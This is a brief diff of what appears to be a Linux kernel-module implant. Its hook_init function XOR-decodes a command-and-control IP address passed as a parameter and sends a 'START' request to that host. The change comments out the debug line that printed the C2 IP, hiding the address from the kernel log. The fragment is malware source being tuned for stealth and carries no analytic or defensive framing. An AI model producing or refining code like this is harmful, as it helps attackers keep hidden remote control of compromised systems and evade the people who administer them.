@@ -172,7 +172,7 @@ static int __init hook_init(void) {
 	// récupérer l'IP du C2 a partir du param
  	u8 key = 126;
 	custom_xor(ip_param, ip_param, key, strlen(ip_param));
-	pr_info("[+] IP: %s\n", ip_param);
+	/* pr_info("[+] IP: %s\n", ip_param); */
 
 	// networking start
 	make_request("START");
